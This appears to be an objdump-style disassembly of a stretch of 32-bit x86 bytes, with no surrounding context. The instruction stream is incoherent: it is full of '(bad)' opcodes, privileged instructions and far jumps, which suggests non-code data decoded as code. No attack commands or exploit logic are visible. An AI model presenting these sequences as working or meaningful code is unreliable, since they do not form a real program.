  41d4f1:	retf   0xc8ad
  41d4f4:	or     BYTE PTR [esi-0x63d2ea3e],dl
  41d4fa:	scas   al,BYTE PTR es:[edi]
  41d4fb:	xchg   al,ah
  41d4fd:	jg     0x41d4f0
  41d4ff:	sbb    BYTE PTR [ebx-0x37c742fa],dl
  41d505:	cmp    BYTE PTR [edi-0x5c011f0d],dh
  41d50b:	add    ebx,esi
  41d50d:	ss (bad) 
  41d510:	cmp    eax,ebp
  41d512:	push   esp
  41d513:	mov    ds:0x332dd94d,al
  41d518:	imul   esp,ebp,0x12
  41d51b:	sub    eax,esp
  41d51d:	pop    ss
  41d51e:	xchg   ebp,eax
  41d51f:	(bad)  
  41d520:	cwde   
  41d521:	scas   al,BYTE PTR es:[edi]
  41d522:	test   DWORD PTR [edi],ecx
  41d524:	xchg   esp,eax
  41d525:	jl     0x41d54b
  41d527:	or     edx,esp
  41d529:	mov    cl,0xcc
  41d52b:	push   0x7eb7cec0
  41d530:	inc    edx
  41d531:	mov    esp,0xc6d38ad6
  41d536:	jo     0x41d54e
  41d538:	(bad)  
  41d539:	jge    0x41d566
  41d53b:	call   0x6c0d2e81
  41d540:	adc    BYTE PTR [eax],al
  41d542:	push   ds
  41d543:	aas    
  41d544:	into   
  41d545:	addr16 inc ecx
  41d547:	xchg   edi,eax
  41d548:	cmp    eax,0x6922701
  41d54d:	pop    esp
  41d54e:	push   esp
  41d54f:	ds mov al,0xe0
  41d552:	pop    edx
  41d553:	call   0x741c65ed
  41d558:	cli    
  41d559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d55a:	aam    0x27
  41d55c:	clc    
  41d55d:	mov    al,ds:0x7e45958a
  41d562:	fs cmp eax,0xb2651708
  41d568:	les    ecx,FWORD PTR [ebp+0x1574ff30]
  41d56e:	xchg   edx,eax
  41d56f:	jae    0x41d5d1
  41d571:	dec    esi
  41d572:	lahf   
  41d573:	div    BYTE PTR [edi]
  41d575:	outs   dx,BYTE PTR ds:[esi]
  41d576:	je     0x41d595
  41d578:	arpl   WORD PTR [ebx+0x42],si
  41d57b:	or     DWORD PTR [eax+eiz*1-0x2b0b6f4b],0x93154144
  41d586:	icebp  
  41d587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d588:	mov    esi,0x87d2dfd4
  41d58d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d58e:	(bad)  
  41d590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d591:	mov    eax,ds:0x62d1f2fa
  41d596:	hlt    
  41d597:	xor    BYTE PTR [eax-0x38],dh
  41d59a:	pop    ds
  41d59b:	shl    DWORD PTR [ecx+ecx*4-0x62],cl
  41d59f:	xchg   edx,eax
  41d5a0:	dec    esp
  41d5a1:	jecxz  0x41d5a1
  41d5a3:	test   al,0x4f
  41d5a5:	test   DWORD PTR [esi-0xd],ecx
  41d5a8:	popf   
  41d5a9:	and    BYTE PTR [esp+ebx*2-0x25],bh
  41d5ad:	gs adc eax,0xa9f92658
  41d5b3:	pop    es
  41d5b4:	in     eax,0x9b
  41d5b6:	clc    
  41d5b7:	fnstenv [edi-0x67bb52c8]
  41d5bd:	cmp    DWORD PTR [ebx+0x52043ccf],esi
  41d5c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5c4:	and    al,0x41
  41d5c6:	and    ecx,DWORD PTR [eax+0x502b28cf]
  41d5cc:	shl    eax,1
  41d5ce:	add    eax,0x6ba6cbb5
  41d5d3:	mov    ds:0xade49910,eax
  41d5d8:	iret   
  41d5d9:	or     al,0x27
  41d5db:	or     DWORD PTR [esi],esi
  41d5dd:	mov    edi,0x3640f34d
  41d5e2:	mov    ecx,0xb9045f55
  41d5e7:	shl    BYTE PTR [esi-0x16],0x8c
  41d5eb:	push   0x793b3f2e
  41d5f0:	jg     0x41d5e4
  41d5f2:	test   DWORD PTR [esi],0x2eb58ad8
  41d5f8:	stc    
  41d5f9:	scas   al,BYTE PTR es:[edi]
  41d5fa:	and    BYTE PTR [edi+esi*2+0x30cc413b],ah
  41d601:	push   esp
  41d602:	jecxz  0x41d5d2
  41d604:	inc    esi
  41d605:	add    ch,BYTE PTR [ebx+0x56]
  41d608:	(bad)
  41d60b:	adc    al,0xa6
  41d60d:	mov    esp,0xafcd7990
  41d612:	mov    ds:0xf04f3164,eax
  41d617:	iret   
  41d618:	sbb    ah,dh
  41d61a:	jmp    0xd9e2:0xe31fd6c2
  41d621:	neg    DWORD PTR [edi+0x64fd51db]
  41d627:	dec    esi
  41d628:	clc    
  41d629:	add    esi,DWORD PTR [eax-0x3181b37e]
  41d62f:	mov    eax,0x1038c3fc
  41d634:	into   
  41d635:	mov    ebx,0x2a78f970
  41d63a:	xor    DWORD PTR [esi*2+0x3b90570f],ebp
  41d641:	clc    
  41d642:	dec    esp
  41d643:	pop    ss
  41d644:	add    edx,DWORD PTR ds:0xa0c2f917
  41d64a:	cs mov ebx,cs
  41d64d:	sub    al,0x30
  41d64f:	mov    edx,0xdbdaf15d
  41d654:	xor    ah,BYTE PTR [edi]
  41d656:	fnstsw WORD PTR [esi-0x36]
  41d659:	hlt    
  41d65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d65b:	sbb    BYTE PTR [edi+ecx*1],0xbe
  41d65f:	cmp    cl,dh
  41d661:	pop    esp
  41d662:	jae    0x41d624
  41d664:	out    dx,al
  41d665:	fcomp  DWORD PTR [ebp-0x5fd0952a]
  41d66b:	in     al,0x9
  41d66d:	cs dec esi
  41d66f:	lahf   
  41d670:	inc    esi
  41d671:	mov    BYTE PTR [esi],dl
  41d673:	cmp    dl,BYTE PTR [esi-0x55]
  41d676:	cli    
  41d677:	stos   BYTE PTR es:[edi],al
  41d678:	mov    edi,0xd9a58a9a
  41d67d:	fcom   QWORD PTR [edx]
  41d67f:	(bad)  
  41d680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d681:	xchg   ebp,eax
  41d682:	mov    esp,0x335bb911
  41d687:	pushf  
  41d688:	fstp   QWORD PTR [esi]
  41d68a:	mov    WORD PTR [eax+0x75],fs
  41d68d:	xchg   ebx,eax
  41d68e:	ret    
  41d68f:	or     al,0x3
  41d691:	mov    dh,0xe2
  41d693:	cwde   
  41d694:	rcr    BYTE PTR [ebx-0x2d],cl
  41d697:	add    ecx,DWORD PTR [edi-0x55]
  41d69a:	and    al,0x9b
  41d69c:	jae    0x41d681
  41d69e:	push   ss
  41d69f:	enter  0xbbc8,0xd1
  41d6a3:	and    edx,DWORD PTR [ebx]
  41d6a5:	jle    0x41d718
  41d6a7:	pop    edx
  41d6a8:	cs scas al,BYTE PTR es:[di]
  41d6ab:	lods   al,BYTE PTR ds:[esi]
  41d6ac:	adc    BYTE PTR [edx],ch
  41d6ae:	loopne 0x41d72f
  41d6b0:	or     dl,0x97
  41d6b3:	mov    edx,0xe94fb796
  41d6b8:	outs   dx,DWORD PTR ds:[esi]
  41d6b9:	hlt    
  41d6ba:	xchg   DWORD PTR [ebx+ebx*8+0x33a56329],ecx
  41d6c1:	in     al,dx
  41d6c2:	cmc    
  41d6c3:	in     al,dx
  41d6c4:	inc    esi
  41d6c5:	mov    bh,0xb4
  41d6c7:	call   0xf45d:0x60e4eb1e
  41d6ce:	xor    ebp,ebx
  41d6d0:	mov    al,0xc8
  41d6d2:	mov    ah,0x20
  41d6d4:	push   edi
  41d6d5:	lea    eax,[ebx-0x41d0ce0]
  41d6db:	mov    ah,0x25
  41d6dd:	int    0x2d
  41d6df:	int    0xf0
  41d6e1:	dec    esp
  41d6e2:	mov    bl,0x67
  41d6e4:	or     bh,bh
  41d6e6:	aas    
  41d6e7:	xchg   esp,eax
  41d6e8:	mov    ebp,0x95ed1997
  41d6ed:	sar    bh,1
  41d6ef:	pop    edi
  41d6f0:	loop   0x41d6c7
  41d6f2:	jmp    0x41d6d8
  41d6f4:	or     DWORD PTR [ebp+0x552e05bf],esi
  41d6fa:	xlat   BYTE PTR ds:[ebx]
  41d6fb:	in     al,dx
  41d6fc:	fdiv   QWORD PTR [edi]
  41d6fe:	dec    eax
  41d6ff:	push   eax
  41d700:	push   ecx
  41d701:	(bad)  
  41d702:	call   0x222aaad9
  41d707:	cli    
  41d708:	push   0xa1430606
  41d70d:	int    0x5c
  41d70f:	jb     0x41d6b4
  41d711:	lods   eax,DWORD PTR ds:[esi]
  41d712:	mov    edi,0xbfac4bcf
  41d717:	cli    
  41d718:	cld    
  41d719:	repnz aad 0x5a
  41d71c:	or     al,0x32
  41d71e:	push   esp
  41d71f:	push   esp
  41d720:	pop    ds
  41d721:	and    BYTE PTR [edx-0x78a6d584],0x8
  41d728:	sar    cl,1
  41d72a:	mov    cl,BYTE PTR [edx-0xdc364c2]
  41d730:	add    bl,ah
  41d732:	lock xor eax,0x5b1763a1
  41d738:	sub    al,0xf3
  41d73a:	xchg   esp,eax
  41d73b:	popa   
  41d73c:	pusha  
  41d73d:	outs   dx,DWORD PTR ds:[esi]
  41d73e:	retf   0x216
  41d741:	cmp    eax,0x1d7ce292
  41d746:	pop    ss
  41d747:	sub    dh,0x15
  41d74a:	sub    al,0x8d
  41d74c:	jge    0x41d733
  41d74e:	sub    DWORD PTR [esi-0x21d9480c],edx
  41d754:	xor    dh,ah
  41d756:	mov    edx,DWORD PTR [edx]
  41d758:	push   cs
  41d759:	and    dh,BYTE PTR [ebx+0x490ef90]
  41d75f:	rcr    BYTE PTR [edi-0x48e3f6e4],0x3d
  41d766:	test   BYTE PTR [edx-0x3],dl
  41d769:	stos   DWORD PTR es:[edi],eax
  41d76a:	in     eax,dx
  41d76b:	gs popa 
  41d76d:	xor    edx,DWORD PTR [ebx+0x38]
  41d770:	add    BYTE PTR [ecx],0x61
  41d773:	xlat   BYTE PTR ds:[ebx]
  41d774:	fdiv   DWORD PTR [ebp-0x22]
  41d777:	icebp  
  41d778:	(bad)  
  41d779:	cmp    eax,0xde9003a9
  41d77e:	test   al,0xbd
  41d780:	xchg   ebp,eax
  41d781:	adc    BYTE PTR ds:0x818e3430,ch
  41d787:	sub    ebx,DWORD PTR [edi+0x73]
  41d78a:	adc    al,0xd8
  41d78c:	jmp    0xfb10:0x6688e534
  41d793:	inc    edi
  41d794:	in     eax,0xd0
  41d796:	stos   BYTE PTR es:[edi],al
  41d797:	dec    ecx
  41d798:	dec    ebp
  41d799:	fcmovbe st,st(6)
  41d79b:	outs   dx,DWORD PTR ds:[esi]
  41d79c:	leave  
  41d79d:	sbb    BYTE PTR [ebp+0x4f],bl
  41d7a0:	jbe    0x41d796
  41d7a2:	or     ebp,DWORD PTR [esi-0x11]
  41d7a5:	mov    bh,0xbf
  41d7a7:	stos   DWORD PTR es:[edi],eax
  41d7a8:	pop    ss
  41d7a9:	retf   
  41d7aa:	sub    BYTE PTR [esi-0x2affeefc],ah
  41d7b0:	in     eax,0xa8
  41d7b2:	mov    eax,0xd882fdea
  41d7b7:	push   esi
  41d7b8:	push   cs
  41d7b9:	sub    eax,0xecf7886a
  41d7be:	imul   eax
  41d7c0:	dec    ebp
  41d7c1:	ror    DWORD PTR [esi-0x6c],0xb
  41d7c5:	ret    
  41d7c6:	out    0xeb,eax
  41d7c8:	jmp    0x64095f0c
  41d7cd:	outs   dx,DWORD PTR ds:[esi]
  41d7ce:	or     eax,0x1f7ef13c
  41d7d3:	dec    ebx
  41d7d4:	test   al,0x25
  41d7d6:	test   eax,0x90a8183b
  41d7db:	jmp    0x487f:0x6233f5cd
  41d7e2:	cmc    
  41d7e3:	sbb    eax,0x29865513
  41d7e8:	stos   DWORD PTR es:[edi],eax
  41d7e9:	loope  0x41d785
  41d7eb:	(bad)  
  41d7ec:	jle    0x41d777
  41d7ee:	lods   al,BYTE PTR ds:[esi]
  41d7ef:	xor    al,0x29
  41d7f1:	push   ds
  41d7f2:	retf   0x9b7d
  41d7f5:	faddp  st(6),st
  41d7f7:	in     al,0x3
  41d7f9:	xchg   esi,eax
  41d7fa:	dec    esp
  41d7fb:	and    BYTE PTR [edx+0x61],bh
  41d7fe:	in     eax,dx
  41d7ff:	jbe    0x41d816
  41d801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d802:	push   cs
  41d803:	or     esi,esi
  41d805:	mov    ecx,DWORD PTR [edx+0x59bcddf2]
  41d80b:	cs mov dl,0xb5
  41d80e:	iret   
  41d80f:	jne    0x41d870
  41d811:	iret   
  41d812:	jmp    0x4d9f:0xb736e7e3
  41d819:	fmul   DWORD PTR [edx]
  41d81b:	inc    esi
  41d81c:	mov    al,BYTE PTR [ebp-0x78]
  41d81f:	iret   
  41d820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d821:	mov    bl,0x16
  41d823:	push   ebx
  41d824:	scas   eax,DWORD PTR es:[edi]
  41d825:	aam    0x35
  41d827:	aas    
  41d828:	nop
  41d829:	pop    edx
  41d82a:	sub    ch,dh
  41d82c:	inc    ecx
  41d82d:	push   ebp
  41d82e:	leave  
  41d82f:	adc    dl,BYTE PTR [ebx+edx*1+0x24]
  41d833:	dec    ax
  41d835:	dec    ebx
  41d836:	or     al,0x18
  41d838:	xlat   BYTE PTR ds:[ebx]
  41d839:	test   BYTE PTR [ecx+ebp*1],al
  41d83c:	dec    ecx
  41d83d:	or     dl,bl
  41d83f:	mov    ecx,DWORD PTR [edx+0x19]
  41d842:	push   es
  41d843:	xor    DWORD PTR [ebx+0x61576179],ebx
  41d849:	mov    BYTE PTR [ecx+esi*8],bl
  41d84c:	mov    edi,0xfb799b01
  41d851:	dec    ebp
  41d852:	gs aad 0xae
  41d855:	xchg   esp,eax
  41d856:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d858:	popa   
  41d859:	or     BYTE PTR [esi+0x77],cl
  41d85c:	mov    ds:0xc0e4aa1e,al
  41d861:	pop    ebx
  41d862:	mov    edx,0x7f66344a
  41d867:	push   cs
  41d868:	pop    ss
  41d869:	std    
  41d86a:	addr16 in eax,dx
  41d86c:	mov    esp,0xe8c79997
  41d871:	addr16 jne 0x41d8ce
  41d874:	hlt    
  41d875:	outs   dx,BYTE PTR ds:[esi]
  41d876:	jbe    0x41d831
  41d878:	js     0x41d870
  41d87a:	xchg   ecx,eax
  41d87b:	arpl   si,cx
  41d87d:	jg     0x41d8f7
  41d87f:	jg     0x41d81a
  41d881:	mov    al,ds:0xaae40f5d
  41d886:	xchg   ecx,eax
  41d887:	ror    DWORD PTR [esi+edx*2+0x4b],cl
  41d88b:	lock or al,0x47
  41d88e:	or     DWORD PTR [ebx-0x47],ebx
  41d891:	sub    DWORD PTR [edi+0x54],edx
  41d894:	and    eax,0x5877ea92
  41d899:	adc    bl,BYTE PTR [eax]
  41d89b:	cld    
  41d89c:	cli    
  41d89d:	sahf   
  41d89e:	(bad)  
  41d89f:	(bad)  
  41d8a1:	ins    DWORD PTR es:[edi],dx
  41d8a2:	lods   eax,DWORD PTR ds:[esi]
  41d8a3:	test   eax,0xc2a0c038
  41d8a8:	les    esp,FWORD PTR [ebx]
  41d8aa:	call   0xa603:0xa67a1d81
  41d8b1:	popf   
  41d8b2:	xor    ebx,ebp
  41d8b4:	or     esp,DWORD PTR [esi]
  41d8b6:	cdq    
  41d8b7:	cld    
  41d8b8:	mov    edx,0xf8d08e5b
  41d8bd:	inc    ebx
  41d8be:	mov    eax,ds:0x9300caca
  41d8c3:	jmp    0xf1ff8f4d
  41d8c8:	sbb    edi,DWORD PTR [esi]
  41d8ca:	push   esp
  41d8cb:	jle    0x41d919
  41d8cd:	xchg   edi,eax
  41d8ce:	sub    ah,al
  41d8d0:	sbb    eax,0x5c11d2f5
  41d8d5:	push   ecx
  41d8d6:	fsubr  st,st(6)
  41d8d8:	mov    ch,0x7b
  41d8da:	stc    
  41d8db:	int3   
  41d8dc:	jo     0x41d872
  41d8de:	inc    ecx
  41d8df:	mov    ds:0xf83cf07e,eax
  41d8e4:	pop    ebp
  41d8e5:	dec    ebx
  41d8e6:	stc    
  41d8e7:	cld    
  41d8e8:	jp     0x41d88e
  41d8ea:	inc    esi
  41d8eb:	xor    al,0xe5
  41d8ed:	add    bh,dl
  41d8ef:	add    edx,DWORD PTR [eax+ebx*4+0x69]
  41d8f3:	xchg   BYTE PTR [esi+0x74],cl
  41d8f6:	enter  0x8b80,0x2a
  41d8fa:	int3   
  41d8fb:	dec    edi
  41d8fc:	leave  
  41d8fd:	jne    0x41d94b
  41d8ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d900:	cmp    bl,BYTE PTR [edi-0x59]
  41d903:	dec    ebx
  41d904:	xlat   BYTE PTR ds:[ebx]
  41d905:	dec    ebx
  41d906:	in     eax,dx
  41d907:	push   cs
  41d908:	mov    cl,0xde
  41d90a:	shl    edi,cl
  41d90c:	js     0x41d972
  41d90e:	push   ebp
  41d90f:	add    esi,DWORD PTR [ebp+0x11b816c3]
  41d915:	cdq    
  41d916:	cmp    BYTE PTR [edi-0x74afebe5],bh
  41d91c:	jae    0x41d921
  41d91e:	mov    esp,0x9482600c
  41d923:	das    
  41d924:	pop    ds
  41d925:	ret    
  41d926:	shl    DWORD PTR [ecx],0x6c
  41d929:	outs   dx,DWORD PTR ds:[esi]
  41d92a:	jl     0x41d9a1
  41d92c:	sbb    ebx,ebx
  41d92e:	(bad)  
  41d92f:	in     eax,0xaa
  41d931:	aad    0x72
  41d933:	xor    ch,BYTE PTR [ebx]
  41d935:	ins    BYTE PTR es:[edi],dx
  41d936:	xchg   esi,eax
  41d937:	pop    ebp
  41d938:	dec    ecx
  41d939:	shr    DWORD PTR [esi-0x11af9130],0x31
  41d940:	push   edi
  41d941:	inc    edx
  41d942:	push   ebx
  41d943:	adc    bl,dh
  41d945:	push   cs
  41d946:	pop    ebx
  41d947:	(bad)  
  41d948:	lock hlt 
  41d94a:	cdq    
  41d94b:	pop    edx
  41d94c:	dec    eax
  41d94d:	ja     0x41d958
  41d94f:	call   0x403e:0xf495a0b8
  41d956:	mov    DWORD PTR [ebx-0x80],esi
  41d959:	aaa    
  41d95a:	cmp    eax,0x81793225
  41d95f:	cmp    al,0x80
  41d961:	xchg   edx,eax
  41d962:	test   al,0x28
  41d964:	test   edi,esi
  41d966:	cmp    ch,dl
  41d968:	jo     0x41d948
  41d96a:	fiadd  DWORD PTR [ebx-0x7aaaf67a]
  41d970:	xor    edi,edi
  41d972:	fistp  WORD PTR [ecx]
  41d974:	jns    0x41d8fc
  41d976:	or     al,0xa8
  41d978:	or     eax,DWORD PTR [edi-0xb]
  41d97b:	push   edx
  41d97c:	sahf   
  41d97d:	inc    esp
  41d97e:	out    dx,al
  41d97f:	pop    ebp
  41d980:	mov    edi,0x476aab84
  41d985:	mov    ebx,0xbf91302d
  41d98a:	in     eax,dx
  41d98b:	cmp    ebx,edi
  41d98d:	gs js  0x41d9fe
  41d990:	ret    0xa6fa
  41d993:	and    bh,BYTE PTR [esi+0x7846b522]
  41d999:	fucomp st(1)
  41d99b:	ins    DWORD PTR es:[edi],dx
  41d99c:	retf   
  41d99d:	int3   
  41d99e:	pushf  
  41d99f:	adc    BYTE PTR es:[ecx+ecx*1],ah
  41d9a3:	jae    0x41d989
  41d9a5:	and    BYTE PTR [ecx],bh
  41d9a7:	dec    ebx
  41d9a8:	mov    bl,0x77
  41d9aa:	adc    al,0x95
  41d9ac:	xchg   edx,eax
  41d9ad:	gs jl  0x41d989
  41d9b0:	mov    eax,ds:0xdaa17c60
  41d9b5:	xor    DWORD PTR [ecx+eax*8],edx
  41d9b8:	xchg   ebx,eax
  41d9b9:	mov    eax,0x44e0aa4b
  41d9be:	int    0xed
  41d9c0:	pop    eax
  41d9c2:	cwde   
  41d9c3:	mov    ds:0x8744c933,eax
  41d9c8:	ret    
  41d9c9:	and    al,0x37
  41d9cb:	mov    dh,0x8a
  41d9cd:	dec    esp
  41d9ce:	xchg   edi,eax
  41d9cf:	and    esi,DWORD PTR [edi+ebp*1+0x58]
  41d9d3:	and    eax,edi
  41d9d5:	adc    eax,0x67e6d43f
  41d9da:	sbb    DWORD PTR [ebx-0x60],ebp
  41d9dd:	js     0x41da2b
  41d9df:	or     esp,DWORD PTR [eax-0xf]
  41d9e2:	mov    ds:0x350122b3,al
  41d9e7:	sbb    al,0xe7
  41d9ea:	mov    al,0xcb
  41d9ec:	mov    ebp,0x7db5f04b
  41d9f1:	mov    bh,0x57
  41d9f3:	icebp  
  41d9f4:	jns    0x41da26
  41d9f6:	inc    ebp
  41d9f7:	adc    DWORD PTR [eax-0x76962226],ecx
  41d9fd:	es sbb ecx,eax
  41da00:	aaa    
  41da01:	je     0x41d988
  41da03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da04:	ins    DWORD PTR es:[edi],dx
  41da05:	sub    al,dh
  41da07:	pop    esp
  41da08:	add    al,0x53
  41da0a:	push   esi
  41da0b:	sbb    ch,BYTE PTR [ecx+0x21]
  41da0e:	fidiv  WORD PTR [eax]
  41da10:	mov    ch,0xe1
  41da12:	xor    BYTE PTR [ecx-0x636f45b2],0x6c
  41da19:	jg     0x41d9f7
  41da1b:	pop    edi
  41da1c:	mov    edi,0x7d128026
  41da21:	es retf 0xe298
  41da25:	and    al,0xe1
  41da27:	mov    al,ds:0xcf5aaff3
  41da2c:	icebp  
  41da2d:	jp     0x41da54
  41da2f:	mov    ebx,DWORD PTR [edx-0x1a]
  41da32:	imul   ecx,DWORD PTR [edx],0xe9d9ab17
  41da38:	push   esi
  41da39:	or     BYTE PTR [edi+0x77],ch
  41da3c:	adc    bl,cl
  41da3e:	popf   
  41da3f:	arpl   WORD PTR [esi-0x3391fd1b],si
  41da45:	add    edi,esi
  41da47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da48:	ins    DWORD PTR es:[edi],dx
  41da49:	push   ecx
  41da4a:	mov    edx,0x603f6943
  41da4f:	inc    DWORD PTR ds:0xf7e228ec
  41da55:	ins    BYTE PTR es:[edi],dx
  41da56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da57:	pusha  
  41da58:	add    ecx,DWORD PTR [esp+eax*1]
  41da5b:	and    bh,BYTE PTR [edx]
  41da5d:	or     ecx,edi
  41da5f:	sub    bh,ch
  41da61:	mov    ah,0x9c
  41da63:	scas   eax,DWORD PTR es:[edi]
  41da64:	push   0x4258effd
  41da69:	xchg   ecx,eax
  41da6a:	fwait
  41da6b:	or     al,0x5
  41da6d:	in     eax,0xb2
  41da6f:	inc    BYTE PTR [ebp-0x80]
  41da72:	mov    ch,0xfa
  41da74:	bound  ecx,QWORD PTR [ecx+0x7807b32c]
  41da7a:	repz cmp DWORD PTR [edx+0x2646a667],ebp
  41da81:	ja     0x41da1c
  41da83:	aas    
  41da84:	clc    
  41da85:	jno    0x41da13
  41da87:	out    0xe,eax
  41da89:	dec    eax
  41da8a:	test   eax,0x25dfd5d6
  41da8f:	pop    esi
  41da90:	fwait
  41da91:	dec    eax
  41da92:	jp     0x41da49
  41da94:	push   edx
  41da95:	pop    ss
  41da96:	fcmovnbe st,st(7)
  41da98:	xor    eax,0x69192c8b
  41da9d:	jl     0x41dad7
  41da9f:	(bad)  
  41daa0:	cmovg  ecx,DWORD PTR [eax+ebp*4]
  41daa4:	pop    ebx
  41daa5:	pop    ebx
  41daa6:	ja     0x41dae3
  41daa8:	and    ebp,ecx
  41daaa:	ja     0x41dad1
  41daac:	add    BYTE PTR [esi],dl
  41daae:	jecxz  0x41da34
  41dab0:	lea    edi,[edi]
  41dab2:	fwait
  41dab3:	rol    BYTE PTR [esi],cl
  41dab5:	inc    eax
  41dab6:	xor    ebx,ebp
  41dab8:	ja     0x41daf2
  41daba:	int3   
  41dabb:	fsubr  DWORD PTR [eax+eax*8]
  41dabe:	(bad)  
  41dabf:	out    0xec,eax
  41dac1:	pop    ds
  41dac2:	mov    ah,0xd6
  41dac4:	push   es
  41dac5:	clc    
  41dac6:	dec    edi
  41dac7:	push   es
  41dac8:	mov    edi,0x58fe5a3
  41dacd:	xchg   ecx,eax
  41dace:	pop    ss
  41dacf:	mov    bh,0x85
  41dad1:	in     al,0x65
  41dad3:	or     al,0xf3
  41dad5:	dec    esp
  41dad6:	add    DWORD PTR [ebx-0x74],ebx
  41dad9:	and    DWORD PTR [esi-0x12d584b8],esi
  41dadf:	sahf   
  41dae0:	xchg   esp,eax
  41dae1:	and    eax,0x4903ef30
  41dae6:	dec    ecx
  41dae7:	rcr    DWORD PTR [ebp+0x575a8c05],1
  41daed:	inc    esi
  41daee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daef:	loop   0x41dae0
  41daf1:	sub    eax,DWORD PTR [esi]
  41daf3:	bswap  ebx
  41daf5:	xor    BYTE PTR [eax+ebp*2-0xb74d556],bl
  41dafc:	mov    edx,0x87fbc864
  41db01:	pop    edi
  41db02:	stc    
  41db03:	push   esi
  41db04:	xor    DWORD PTR [ecx+0x6a50ba2d],0xac73c86
  41db0e:	imul   esp,DWORD PTR [eax+0x20bfd85e],0xffffff82
  41db15:	out    0x21,al
  41db17:	sub    BYTE PTR [ebp-0x33e0f070],al
  41db1d:	adc    eax,esp
  41db1f:	cmc    
  41db20:	and    eax,0xaba450f9
  41db25:	mov    fs,WORD PTR [esi-0x29]
  41db28:	sub    al,0xc0
  41db2a:	push   esp
  41db2b:	fwait
  41db2c:	pushf  
  41db2d:	inc    esi
  41db2e:	out    dx,al
  41db2f:	and    esi,DWORD PTR [eax]
  41db31:	mov    esp,0xf5f15a9
  41db36:	in     al,0xca
  41db38:	sbb    al,0x53
  41db3a:	mov    eax,ds:0xd6e136f8
  41db3f:	ret    0xd19e
  41db42:	popw   ss
  41db44:	sub    eax,0x8060dd2a
  41db49:	mov    al,ds:0x37745103
  41db4e:	in     eax,dx
  41db4f:	test   al,0xf9
  41db51:	xchg   edi,eax
  41db52:	addr16 mov ch,0x90
  41db56:	xchg   ebp,eax
  41db57:	or     esp,DWORD PTR [esi+0x72]
  41db5a:	mov    cl,0x61
  41db5c:	pop    ds
  41db5d:	into   
  41db5e:	lahf   
  41db5f:	pop    esp
  41db60:	mov    edi,0x1d549dee
  41db65:	push   edi
  41db66:	dec    edi
  41db67:	imul   edi,edx,0xffffff82
  41db6a:	jnp    0x41db18
  41db6c:	jae    0x41dbd0
  41db6e:	icebp  
  41db6f:	cmp    ah,dl
  41db71:	mov    ebp,0x6671eae7
  41db76:	les    esi,FWORD PTR [esp+ecx*1-0x3831053b]
  41db7d:	test   BYTE PTR [edx-0x554951ee],bl
  41db83:	jno    0x41dbcb
  41db85:	inc    BYTE PTR [edi+edi*1+0x41]
  41db89:	adc    DWORD PTR [edi-0x66574d8f],esp
  41db8f:	retf   0xcdbc
  41db92:	sub    cl,BYTE PTR [ebp-0x1698d3b3]
  41db98:	mov    eax,ds:0x1e76b02f
  41db9d:	sbb    eax,0x234db9e2
  41dba2:	rol    ah,cl
  41dba4:	cmp    al,ah
  41dba6:	enter  0xa308,0xf1
  41dbaa:	loopne 0x41db62
  41dbac:	shr    DWORD PTR [edi+eax*1+0x78],1
  41dbb0:	sub    DWORD PTR [esi+0x7f],edx
  41dbb3:	inc    ecx
  41dbb4:	stos   BYTE PTR es:[edi],al
  41dbb5:	loopne 0x41dc1c
  41dbb7:	jo     0x41dc13
  41dbb9:	jle    0x41dbea
  41dbbb:	and    eax,0x32340e5f
  41dbc0:	xor    eax,0xf0e111de
  41dbc5:	push   ss
  41dbc6:	clc    
  41dbc7:	mov    ax,ds:0xef93dd73
  41dbcd:	push   esp
  41dbce:	repz int3 
  41dbd0:	inc    edx
  41dbd1:	xchg   ecx,eax
  41dbd2:	sbb    bl,BYTE PTR ds:0x2beef98d
  41dbd8:	sbb    esi,DWORD PTR [edi+0x2a23dd2f]
  41dbde:	adc    ch,BYTE PTR [eax]
  41dbe0:	cwde   
  41dbe1:	(bad)  
  41dbe2:	and    eax,0x751e87f5
  41dbe7:	cmp    DWORD PTR [edx],esi
  41dbe9:	ins    BYTE PTR es:[edi],dx
  41dbea:	call   0xc78c:0xb372de58
  41dbf1:	mov    ds:0x43a2056c,al
  41dbf6:	and    al,BYTE PTR [ebp+0x48]
  41dbf9:	fdivrp st(3),st
  41dbfb:	mov    ?,WORD PTR [eax+ecx*8]
  41dbfe:	(bad)  
  41dbff:	jo     0x41dba9
  41dc01:	lock leave 
  41dc03:	mov    WORD PTR [edx+edx*4],gs
  41dc06:	push   ss
  41dc07:	scas   al,BYTE PTR es:[edi]
  41dc08:	addr16 dec esp
  41dc0a:	mov    BYTE PTR [ecx-0x74],bh
  41dc0d:	ret    
  41dc0e:	sbb    al,0x63
  41dc10:	dec    esp
  41dc11:	sub    BYTE PTR [ecx-0x28371ac],bl
  41dc17:	out    dx,eax
  41dc18:	pusha  
  41dc19:	fldcw  WORD PTR [ebx-0x6c21ef1a]
  41dc1f:	cwde   
  41dc20:	ret    0xbf64
  41dc23:	scas   al,BYTE PTR es:[edi]
  41dc24:	mov    eax,ds:0xd885ad0b
  41dc29:	out    dx,al
  41dc2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc2b:	dec    edx
  41dc2c:	mov    edx,0xd39cdf6f
  41dc31:	and    eax,0xb00c8297
  41dc36:	pop    edx
  41dc37:	cmp    DWORD PTR [edi],edi
  41dc39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc3a:	mov    ?,edi
  41dc3c:	push   eax
  41dc3d:	das    
  41dc3e:	in     eax,dx
  41dc3f:	sub    eax,0xd1478cfb
  41dc44:	pop    ebp
  41dc45:	test   DWORD PTR [ebp-0x7c5a5179],ebp
  41dc4b:	adc    dl,bh
